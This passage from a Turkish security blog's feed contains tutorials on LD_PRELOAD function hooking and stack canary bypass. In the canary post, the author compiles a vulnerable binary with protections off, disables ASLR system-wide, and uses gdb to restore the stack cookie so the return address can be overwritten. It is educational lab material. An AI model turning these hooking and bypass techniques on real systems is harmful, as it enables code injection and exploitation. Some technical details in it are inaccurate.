&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc libornek.c -o libornek.so -fPIC -shared -ldl -D_GNU_SOURCE
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Derlemeden sonra klasörünüze &lt;strong&gt;libornek.so&lt;/strong&gt; adında bir kütüphane eklenecektir.&lt;/p&gt;

&lt;p&gt;Şimdi bu yazdığımız kütüphaneyi &lt;strong&gt;LD_PRELOAD&lt;/strong&gt; ortam değişkenine atıp önceden yazdığımız &lt;strong&gt;ornek.c&lt;/strong&gt; yazılımını manipule etmemiz için alttaki komut satırında gerçekleştirdiğim işlemi yapınız.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;remnux@remnux:~/hoq$ ls
libornek.c  libornek.so  ornek  ornek.c
remnux@remnux:~/hoq$ pwd
/home/remnux/hoq
remnux@remnux:~/hoq$ export LD_PRELOAD=&quot;/home/remnux/hoq/libornek.so&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Export ile &lt;strong&gt;LD_PRELOAD&lt;/strong&gt; ortam değişkenine kütüphanemizi aktardığımıza göre bu ortam değişkeninin ne olduğundan bahsedebiliriz.&lt;/p&gt;

&lt;p&gt;Bu ortam değişkeni yani &lt;strong&gt;enviroment variablesi&lt;/strong&gt; linux içerisinde çoook meşhurdur. Hani bahsetmiştik ya bir yazılım çalıştırdığımız da o yazılım önce &lt;strong&gt;(Library, Memory Regions)&lt;/strong&gt; gibi bölümleri yükler diye.&lt;/p&gt;

&lt;p&gt;İşte bu &lt;strong&gt;LD_PRELOAD&lt;/strong&gt; ortam değişkeni çalışan yazılımın başladığı anda bizim verdiğimiz kütüphaneyi içine almasını sağlıyor böyleliklede yazılımları manipule edebiliyoruz.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;LD_PRELOAD&lt;/strong&gt; değişkenine kütüphanemiz atanmadan önce &lt;strong&gt;ornek.c&lt;/strong&gt; :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://pastebin.com/dKF6DVrU&quot;&gt;Pastebin&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Atandıktan sonra :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://pastebin.com/6vnbTiR5&quot;&gt;Pastebin&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Aradaki farkı incelersek görebiliriz ki :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x7ffff7bd8000     0x7ffff7bd9000     0x1000        0x0 /home/remnux/hoq/libornek.so
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;LD_PRELOAD&lt;/strong&gt; ortam değişkenine libornek.so atandıktan sonra &lt;strong&gt;ornek.c&lt;/strong&gt; yazılımı içerisinede her çalışmada enjekte oluyor.&lt;/p&gt;

&lt;hr /&gt;
&lt;h1 id=&quot;the-end&quot;&gt;THE END&lt;/h1&gt;
&lt;p&gt;Tüm bu olanlardan öncesi ve sonrasında ne değiştiğini görmek istersek şayet :&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;ornek.c&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;

int main(){

  puts(&quot;Hello world !&quot;);

}

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Burada puts “Hello World” yazdır demesine rağmen içerisine enjekte ettiğimiz kütüphane bunu manipule ediyor ve biz bunu çalıştırmak istediğimiz de “Hello World” yerine oluşturduğumuz &lt;strong&gt;libornek.c&lt;/strong&gt; kütüphanesinde yaptığımız manipule teknikleri ile eklediğimiz “Yeni Mesaj” çıktısı geliyor.&lt;/p&gt;

&lt;p&gt;Öncesi  :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;remnux@remnux:~/hoq$ ./ornek
Hello world !
remnux@remnux:~/hoq$
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Function hooking işlemini yazdığımız kütüphaneyi &lt;strong&gt;LD_PRELOAD&lt;/strong&gt;‘a attıktan sonrası:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;remnux@remnux:~/hoq$ export LD_PRELOAD=&quot;/home/remnux/hoq/libornek.so&quot;
remnux@remnux:~/hoq$ ./ornek
Yeni mesaj
remnux@remnux:~/hoq$
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Umarım yazıyı beğenmişsinizdir ve açıklayabilmişimdir &lt;strong&gt;Function Hooking&lt;/strong&gt;, &lt;strong&gt;Load-Time&lt;/strong&gt;, &lt;strong&gt;LD_PRELOAD&lt;/strong&gt; vs.. gibi terimleri. İyi günler.&lt;/p&gt;</content><author><name></name></author><summary type="html">Linux Load-Time Function Hooking</summary></entry><entry><title type="html">Stack Canary Bypass</title><link href="http://192.168.254.251:4000/2018/11/17/Stack-Canary-Bypass.html" rel="alternate" type="text/html" title="Stack Canary Bypass" /><published>2018-11-17T00:00:00+03:00</published><updated>2018-11-17T00:00:00+03:00</updated><id>http://192.168.254.251:4000/2018/11/17/Stack-Canary-Bypass</id><content type="html" xml:base="http://192.168.254.251:4000/2018/11/17/Stack-Canary-Bypass.html">&lt;p&gt;Yazımıza geçmeden önce ben videodan daha iyi öğrenirim diyen arkadaşlar için youtube’da çektiğim videoya alalım sizleri : &lt;a href=&quot;https://www.youtube.com/watch?v=sWKxjoZKhx4&amp;amp;t=845s&quot;&gt;Video&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Merhaba arkadaşlar bu blogum da sizlere standart güvenlik önlemlerinden biri olan &lt;strong&gt;Stack Canary&lt;/strong&gt; yani bir diğer adı ile de &lt;strong&gt;Stack Cookie&lt;/strong&gt;‘sinin nasıl bypass edileceğinden bahsedeceğim. Kafanız da güvenlik önemleri terimine ait bir yapı olmuşması için çoğumuzun bildiği bir kaç güvenlik önleminin ismini vererek yazıma başlamak istiyorum.  &lt;strong&gt;ASLR, NX, RELRO, SafeSEH, DEP&lt;/strong&gt; ve benzerleri… “Stack Canary” gibi güvenlik önlemleridir. Derleyiciniz ile bunları belirleyip işleme geçirebilirsiniz. Ya da işletim sisteminizi bunu otomatik belirlemesi için ayarlaya bilirsiniz.&lt;/p&gt;

&lt;h1 id=&quot;güvenlik-önlemlerinden-kısa-bahsedelim&quot;&gt;Güvenlik Önlemlerinden kısa bahsedelim&lt;/h1&gt;

&lt;p&gt;Güvenlik zafiyetlerinin sömürgesini bir az da olsa engellemek için vardırlar. Zafiyetler içerisinden en çok bilineni “Buffer Overflow” dur. Birazdan bahsedeceğimiz &lt;strong&gt;Stack Canary&lt;/strong&gt;‘nin bize &lt;strong&gt;Buffer Overflow&lt;/strong&gt; zafiyetini kullanmamamız için ne gibi engellerde bulunduğunu anlatmaya başladığımız da daha iyi kavrayacaksınızdır güvenlik önlemlerinin neler olduklarını.&lt;/p&gt;

&lt;h1 id=&quot;stack-canary-nedir-&quot;&gt;Stack Canary Nedir ?&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;Stack Canary&lt;/strong&gt; yazılım başlamadan önce yazılımın en üstünde &lt;strong&gt;EBP&lt;/strong&gt; registerine aktarılmaya hazır 32 bit ise &lt;strong&gt;GS&lt;/strong&gt; 64 bit ise &lt;strong&gt;FS&lt;/strong&gt; flaglerinde rastegele oluşturulmuş bir değer saklar. Ve programın sonunda da bu değer hala aynımı diye test eder. Aşşağıda ki küçük python kodu bunu daha basit açıklayabilir.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from random import randint
cookie = randint(100, 100000)

cookie_backup = cookie

if cookie != cookie_backup:
 print(&quot;*** Stack Smash Detected ***&quot;)
 exit(0)
else:
 devametbeklemeyapma()

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Yukarıda ki kodu anlamayanlar varsa basitçe anlatayım. 100 ile 100000 arasında rastgele bir sayı üretiyor ve bu ürettiğiyi sayıyı cookie değişkenine aktarıyor ve bu cookie değişkenini saklamak için cookie_backup değişkenine atıyor ve eğer bu cookie değişkeninin değeri programın sonunda aynı değil ise “Stack Smash Detected” outputunu verip programdan çıkış yapıyor. Aynı ise normal bir şekilde programa kışına devam ediyor. &lt;strong&gt;Stack Canary&lt;/strong&gt; basit bir şekilde bu işi yapıyor.&lt;/p&gt;

&lt;p&gt;Eğer programın başında verilen cookie değeri değiştirildiyse programdan çıkış yapıyor. Aynı ise normal devam ediyor. Peki ya buffer overflowu engelleyen durum ne ? O kısımada birazdan geleceğiz.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Stack Canary&lt;/strong&gt; bizleri bulunan buffer alanının üzerine yazıp geçmekten alı koyan güvenlik önlemlerinden biridir. Bunun yapısını anlatmak için varsayalım ki aşşağıdaki gibi bir 64 bytelık buffer alanımız var.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;char buffer[64];
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ve bu buffer alanı dışardan gelen bir veriyi &lt;strong&gt;strcpy&lt;/strong&gt; fonksiyonu ile buffer alanının içerisine aktarıyor.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;strcpy(buffer, argv[1]);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Normal bir programın akışını &lt;strong&gt;Buffer Overflow&lt;/strong&gt; zafiyeti ile terse kullandığımız da normal olarak 64 byte’ın üzerinde bir değer yazacağımızdan alanı delip geçeceğizdir ve stack içerisinde değişkenlere, adreslere ve benzerlerine yazacak hale geleceğizdir. En önemlisi de &lt;strong&gt;EIP&lt;/strong&gt; registerinin üzerine yazmak ve return adresini kontrol edip programa kışını yönlendirmek. Fakat &lt;strong&gt;Stack Canary&lt;/strong&gt;‘nin &lt;strong&gt;Cookie&lt;/strong&gt;‘leri bize engel olacağından &lt;strong&gt;Buffer Overflow&lt;/strong&gt; zafiyetini kullanamayacağızdır.&lt;/p&gt;

&lt;p&gt;Ve unutmayalım ki &lt;strong&gt;Cookie&lt;/strong&gt;‘ler &lt;strong&gt;dinamiktir&lt;/strong&gt; aynı değillerdir her program çalıştığın da farklı bir değer alırlar.&lt;/p&gt;

&lt;p&gt;Stack içerisin de normal bir programın ve &lt;strong&gt;Stack Canary&lt;/strong&gt; güvenlik önleminin etkin olduğu programın görüntüsü :&lt;/p&gt;

&lt;p&gt;Normal :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-------------------
|                 |
|  Buffer         |
|------------------
|  Saved EIP |
-------------------
|  Saved EBP |
|------------------
|  Return Address  |
 ------------------

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Stack Canary :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-------------------
|                 |
|  Buffer         |
|                 |
|------------------
|  Cookie         |
|------------------
|  Saved EIP      |
-------------------
|  Saved EBP      |
-------------------
|  __stack_chk_fail@plt |
|------------------
|  Return Address |
 ------------------

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;ortamımızı-hazırlayalım&quot;&gt;Ortamımızı hazırlayalım&lt;/h1&gt;

&lt;p&gt;Aşşağıda ki kaynak kodu indirelim ve belirtilen opsiyonlar ile derliyelim. Sonra da &lt;strong&gt;ASLR&lt;/strong&gt;‘yi devre dışı bırakalım.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://pastebin.com/pUJwmRgu&quot;&gt;Örnek Buffer Overflow&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc -Wl,-z,norelro -z execstack -no-pie canary.c -o canary&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;ASLR&lt;/strong&gt;‘yi disable etmek için bu command line kodu kullanalım :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;yavaştan-analize-başlayalım-ve-stack-canaryi-daha-iyi-anlayalım&quot;&gt;Yavaştan analize başlayalım ve stack canary’i daha iyi anlayalım&lt;/h1&gt;

&lt;p&gt;Yukarıdakileri yaptıktan sonra programı aşşağıda ki gibi çalıştıralım ve çıkacak sonuca bakalım :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@ubuntu:~# ./canary AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
*** stack smashing detected ***: &amp;lt;unknown&amp;gt; terminated
Aborted (core dumped)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Buffer alanımız 64 olduğu için 64’ten daha büyük bir byte sayısı verdiğimiz de program crash oluyor fakat bu normal bir crash değil. Normal de hatırlarsanız &lt;strong&gt;Segmentation fault&lt;/strong&gt; çıktısını alıyorduk.&lt;/p&gt;

&lt;p&gt;Bu sefer “Stack Smashing Detected” Çıktısını aldık. Bu bizim &lt;strong&gt;Stack Canary&lt;/strong&gt;‘mizin güvenlik önlemi. Şimdi assembly içerisinde biraz daha detaylı inceleyelim :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://i.imgur.com/RgGDoqL.png&quot;&gt;Disassemble Edilmiş ./canary&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Yukarıda ki fotorafa girdiğimiz de normal bir program akışı dışın da programın içerisinde bulunan bir kaç kod parçacığı görebiliyoruz. Bunlardan biri :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x0000000000401151 &amp;lt;+15&amp;gt;:    mov    rax,QWORD PTR fs:0x28
0x000000000040115a &amp;lt;+24&amp;gt;:    mov    QWORD PTR [rbp-0x8],rax
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Bir diğeri ise :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x0000000000401190 &amp;lt;+78&amp;gt;:    mov    rcx,QWORD PTR [rbp-0x8]
0x0000000000401194 &amp;lt;+82&amp;gt;:    xor    rcx,QWORD PTR fs:0x28
0x000000000040119d &amp;lt;+91&amp;gt;:    je     0x4011a4 &amp;lt;main+98&amp;gt;
0x000000000040119f &amp;lt;+93&amp;gt;:    call   0x401040 &amp;lt;__stack_chk_fail@plt&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Başta yazdığımız küçük python kodunu hatırladınızmı ? Aslında burada dönen olay oradakiyle tam aynı.&lt;/p&gt;

&lt;p&gt;64 bit bir işletim sistemi kullandığımızdan &lt;strong&gt;FS&lt;/strong&gt; flaginin içerisinden 0x28 offsetini &lt;strong&gt;RAX&lt;/strong&gt; registerine movluyor. Peki bu &lt;strong&gt;FS&lt;/strong&gt; registerinin 0x28 içerisinde ne var ?&lt;/p&gt;

&lt;p&gt;Tabiki de bizim &lt;strong&gt;Stack Cookie&lt;/strong&gt;‘miz olan &lt;strong&gt;0x24582bb086d7a100&lt;/strong&gt; :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda$ x/x $rax
0x24582bb086d7a100:     Cannot access memory at address 0x24582bb086d7a100
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Unutmayalım ki 64 bit sistemler de &lt;strong&gt;Stack Cookie&lt;/strong&gt;‘sinin uzunluğu 7 byte’tır. 32 Bit sistemler de ise bu 4 bytetır ve bunların ikisi de bakın burası çok önemli &lt;strong&gt;00&lt;/strong&gt; ile başlar.&lt;/p&gt;

&lt;p&gt;Python kodunda da olduğu gibi şuan da cookieyi cookie_backup değişkenine aktardık.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Kod parçacığı olan kısım ise bu cookie hala aynımı değilmi testidir.&lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x401190 &amp;lt;main+78&amp;gt;:  mov    rcx,QWORD PTR [rbp-0x8]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Bu kısım ile rbp-0x8’de bulunan &lt;strong&gt;Stack Cookie&lt;/strong&gt;‘sini &lt;strong&gt;RCX&lt;/strong&gt; registerine atıyoruz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x401194 &amp;lt;main+82&amp;gt;:  xor    rcx,QWORD PTR fs:0x28
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;XOR&lt;/strong&gt; ile de bu &lt;strong&gt;Stack Cookie&lt;/strong&gt;‘sinin değiştirilip değiştirilmediğine bakıyoruz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x40119d &amp;lt;main+91&amp;gt;:  je     0x4011a4 &amp;lt;main+98&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Eğer değiştirilmediyse program akışını normal şekil de devam ettir.&lt;/p&gt;

&lt;p&gt;Değiştirilmediyse :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x000000000040119f &amp;lt;+93&amp;gt;:    call   0x401040 &amp;lt;__stack_chk_fail@plt&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;__stack_chk_fail fonksiyonunu çağır.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Bu fonksiyon da bizi programdan atıp exit(0) fonksiyonunu çağırıp programdan çıkıyor. Ekranada “Stack Smashin Detected” yazdırıyor.&lt;/p&gt;

&lt;p&gt;Yani buradaki en önemli kısım olan :&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Buffer alanını deldiğimiz sırada cookie’nin üzerine de yazdığımızdan program bir iş karıştırdığımızı anlıyor ve çıkış yapıp ekrana stack’i ezmeye çalıştığımızı yazıyor.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Yani biz &lt;strong&gt;EIP&lt;/strong&gt; registerinin üzerine yazalım derken &lt;strong&gt;Stack Cookie&lt;/strong&gt;‘sinin de üzerine yazıyoruz ve &lt;strong&gt;__stack_chk_fail&lt;/strong&gt; fonksiyonu bu değişikliği görüp birşeyler yapmaya çalıştığımızı anlayıp programdan &lt;strong&gt;exit(0)&lt;/strong&gt; fonksiyonu ile çıkış yapıyor.&lt;/p&gt;

&lt;p&gt;Gnu Debugger ile programa &lt;strong&gt;92&lt;/strong&gt; byte verelim. Normal de &lt;strong&gt;92&lt;/strong&gt; byte’ta &lt;strong&gt;EIP&lt;/strong&gt; registerinin üzerine yazıp shellcode’un adresini verebilmemiz lazımdı fakat çalıştırdığımız da :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/Q444cqe.png&quot; alt=&quot;Can't overwrite EIP&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Görebiliriz ki &lt;strong&gt;EIP&lt;/strong&gt; üzerine yazamıyoruz çünkü &lt;strong&gt;Stack Cookie&lt;/strong&gt;‘sinin üzerine yazdık ve &lt;strong&gt;__stack_chk_fail&lt;/strong&gt; bunu görüp programı durdurdu ve ekrana “&lt;em&gt;** Stack Smash Detected **&lt;/em&gt;” yazısını yazdı.&lt;/p&gt;

&lt;h1 id=&quot;stack-canarynin-bypass-edilme-tekniği&quot;&gt;Stack Canary’nin bypass edilme tekniği&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;Stack Canary&lt;/strong&gt;‘nin ne olduğunu iyice kavradığımıza göre yavaştan bypass edilmesine geçelim.&lt;/p&gt;

&lt;p&gt;Bypass tekniği olmadan neler olduğunu yukarı da gördük şimdi eip yani return adresini değiştirmemiz için nasıl bypass edileceğini açıklayalım.&lt;/p&gt;

&lt;p&gt;Öncelikle programa tekrar &lt;strong&gt;88&lt;/strong&gt; bytelık &lt;strong&gt;A&lt;/strong&gt; harfini verelim ve geri kalan 4 byte’ı da &lt;strong&gt;B&lt;/strong&gt; ile dolduralım ve eip üzerine &lt;strong&gt;B&lt;/strong&gt;‘leri nasıl ekleyeceğimizi görelim &lt;strong&gt;Stack Canary&lt;/strong&gt;‘i bypass edip.&lt;/p&gt;

&lt;p&gt;GDB ile bu kısıma geldiğimiz de:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x401151 &amp;lt;main+15&amp;gt;:  mov    rax,QWORD PTR fs:0x28
0x40115a &amp;lt;main+24&amp;gt;:  mov    QWORD PTR [rbp-0x8],rax
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;RAX&lt;/strong&gt; registerine aktarılan &lt;strong&gt;Cookie&lt;/strong&gt; değerini alıp saklamamız gerek. Yani notepade yazın, chrome’de yeni sekme oluşturun yazın yada aklınızda tutun ama bir yerde tutun o adresi :&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;x/x $rax&lt;/strong&gt; komutu ile &lt;strong&gt;gdb&lt;/strong&gt; içerisinde &lt;strong&gt;Cookie&lt;/strong&gt; değerini aldım ben &lt;strong&gt;0x3169b6a3c855be00&lt;/strong&gt;. 64 Bit olduğu için 7 byte uzunlıkta ve &lt;strong&gt;00&lt;/strong&gt; ile başlıyor.&lt;/p&gt;

&lt;p&gt;Şimdi adresi aldığımıza göre 2. kısmımıza geçelim ve &lt;strong&gt;RCX&lt;/strong&gt; registerinin değeri yani &lt;strong&gt;Cookie&lt;/strong&gt;‘mizin değeri büyük ihtimal &lt;strong&gt;B&lt;/strong&gt;‘ler ve &lt;strong&gt;A&lt;/strong&gt;‘lar ile kaplanmış olucaktır. &lt;strong&gt;__stack_chk_fail&lt;/strong&gt; kısmına gelmeden &lt;strong&gt;breakpoint&lt;/strong&gt; ile duralım yani bu kısımda :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;=&amp;gt; 0x401194 &amp;lt;main+82&amp;gt;:  xor    rcx,QWORD PTR fs:0x28
0x40119d &amp;lt;main+91&amp;gt;:  je     0x4011a4 &amp;lt;main+98&amp;gt;
0x40119f &amp;lt;main+93&amp;gt;:  call   0x401040 &amp;lt;__stack_chk_fail@plt&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Bir adım ilerleyelim ve &lt;strong&gt;RCX&lt;/strong&gt; registerinin değerine bakalım :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda$ x/x $rcx
0x4141414141414141:     Cannot access memory at address 0x4141414141414141
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Görebiliyoruz ki &lt;strong&gt;Cookie&lt;/strong&gt; değerimiz &lt;strong&gt;A&lt;/strong&gt; harfi ile dolmuş ve &lt;strong&gt;_stack_chk_fail&lt;/strong&gt; bu &lt;strong&gt;Cookie&lt;/strong&gt; değerinin değiştiğini görecektir bu yüzden bizim başta sakladığımız cookie değerini tekrar &lt;strong&gt;RCX&lt;/strong&gt; registerine vermemiz gerekiyor.&lt;/p&gt;

&lt;p&gt;Şu şekilde verelim hemen :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda$  set $rcx = 0x3169b6a3c855be00
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ve tekrardan bakalım &lt;strong&gt;Cookie&lt;/strong&gt; değerimiz verildimi diye :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda$ x/x $rcx
0x3169b6a3c855be00:     Cannot access memory at address 0x3169b6a3c855be00
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Cookie&lt;/strong&gt; değerimiz eski haline döndü ve programdan artık çıkış yapılmayacaktır. Bizde &lt;strong&gt;EIP&lt;/strong&gt; registerinin üzerine basit bir şekilde yazabiliriz bundan sonra :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://i.imgur.com/kSwv6YW.png&quot;&gt;EIP Resim&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ve gördüğünüz gibi &lt;strong&gt;EIP&lt;/strong&gt; registerinin üzerine yani return addresinin üzerine &lt;strong&gt;B&lt;/strong&gt; harflerimizi yerleştirdik tabi bu bir örnek oraya normal de shellcodeumuzun adresi geliyor.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;GDB&lt;/strong&gt; içerisin de yukarıdaki adımları takip etmeniz çok önemli.&lt;/p&gt;

&lt;p&gt;Okuduğunuz için çok teşekkürler umarım yardımcı olabilmişimdir. Sorularınız varsa veya herhangi bir hata gördüyseniz lütfen bana twitter hesabım olan @0DAYanc’tan yazmaya çekinmeyin. Bir Sonraki Yazıda Görüşmek Üzere !&lt;/p&gt;</content><author><name></name></author><summary type="html">Yazımıza geçmeden önce ben videodan daha iyi öğrenirim diyen arkadaşlar için youtube’da çektiğim videoya alalım sizleri : Video</summary></entry><entry><title type="html">PE Code Injection</title><link href="http://192.168.254.251:4000/2018/10/26/pe-code-injection.html" rel="alternate" type="text/html" title="PE Code Injection" /><published>2018-10-26T00:00:00+03:00</published><updated>2018-10-26T00:00:00+03:00</updated><id>http://192.168.254.251:4000/2018/10/26/pe-code-injection</id><content type="html" xml:base="http://192.168.254.251:4000/2018/10/26/pe-code-injection.html">&lt;p&gt;Paylaştığım video da blogum da yayınlıyacağım demiştim fakat fikrimi değiştirdim çünkü video da herşeyi en son detayına kadar anlatmışım ve 25 dakika sürmüş. Eğer bu blog kısmında da anlatmaya çalışırsam zilyon sayfa yazı çıkar. O yüzden direk youtube linkini paslıyorum izlemek isteyenler için. :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=w4tioqtw2pM&quot;&gt;PE Code Injection&lt;/a&gt;&lt;/p&gt;

